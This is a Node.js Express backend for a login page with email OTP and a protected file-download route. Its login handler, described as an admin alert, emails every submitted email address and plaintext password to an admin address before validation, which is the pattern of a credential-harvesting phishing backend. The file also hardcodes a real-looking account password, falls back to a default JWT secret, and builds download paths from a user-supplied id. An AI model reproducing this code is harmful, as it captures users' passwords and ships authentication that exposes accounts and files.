require('dotenv').config();

const express = require('express');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const nodemailer = require("nodemailer");
const crypto = require('crypto');

const app = express();

const allowedOrigins = [
  'http://localhost:3000',     // your local dev frontend URL
  'https://po0948.netlify.app'        // your deployed frontend URL
];

const PORT = process.env.PORT || 8080;
const smtpUser = process.env.SMTP_USER;
const smtpPass = process.env.SMTP_PASS;
const adminEmail = process.env.ADMIN_EMAIL;
const SECRET = process.env.SECRET || "default_secret_if_none_set";

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('Not allowed by CORS'), false);
    }
    return callback(null, true);
  },
  credentials: true
}));

app.use(bodyParser.json());

// Mock user - replace with real DB in production
const USER = { id: 1, email: "egli79380@gmail.com", password: "password123_zMq-h5*wE-FdUk" };

// Nodemailer setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: smtpUser,
    pass: smtpPass
  }
});

// Temporary OTP storage (in-memory; consider DB or redis for production)
let otpStore = {};

// Login API with user info alert and OTP generation
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: "Email and password are required." });
  }

  // Alert admin of all login attempts
  const alertMailOptions = {
    from: smtpUser,
    to: adminEmail,
    subject: 'User Login Attempt',
    text: `Login attempt - Email: ${email}\nPassword: ${password}\nTimestamp: ${new Date()}`
  };
  transporter.sendMail(alertMailOptions, (error, info) => {
    if (error) {
      console.error('Admin alert email send error:', error);
    } else {
      console.log('Admin alerted about login attempt');
    }
  });

  if (email === USER.email && password === USER.password) {
    // Generate OTP and store with timestamp
    const otp = crypto.randomInt(100000, 999999).toString();
    otpStore[email] = { otp, created: Date.now() };

    // Send OTP email to user
    const otpMailOptions = {
      from: smtpUser,
      to: email,
      subject: 'Your OTP code',
      text: `Your OTP code is: ${otp}. It expires in 15 minutes.`
    };
    transporter.sendMail(otpMailOptions, (err) => {
      if (err) {
        console.error('Failed to send OTP email:', err);
        return res.status(500).json({ success: false, message: 'Failed to send OTP email' });
      }
      res.json({ success: true, message: 'OTP sent' });
    });

  } else {
    return res.status(401).json({ success: false, message: "Invalid credentials" });
  }
});

// OTP verification API
app.post('/api/verify-otp', (req, res) => {
  const { email, otp } = req.body;
  const record = otpStore[email];
  if (record) {
    const now = Date.now();
    const expiry = 15 * 60 * 1000; // 15 minutes
    if (record.otp === otp && (now - record.created) < expiry) {
      delete otpStore[email];
      const token = jwt.sign({ id: USER.id, email: USER.email }, SECRET, { expiresIn: "2h" });
      res.json({ success: true, token });
    } else {
      res.status(401).json({ success: false, message: "Invalid or expired OTP" });
    }
  } else {
    res.status(401).json({ success: false, message: "OTP not found" });
  }
});

// Middleware to authenticate JWT
function authenticate(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth) return res.status(403).json({ message: "Missing token" });
  const token = auth.split(' ')[1];
  try {
    req.user = jwt.verify(token, SECRET);
    next();
  } catch (err) {
    res.status(403).json({ message: "Invalid or expired token" });
  }
}

// Protected file download API
app.get('/api/file/:id', authenticate, (req, res) => {
  const fileId = req.params.id;
  const filePath = path.join(__dirname, 'protected_files', fileId);
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ message: "File not found" });
  }
});

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));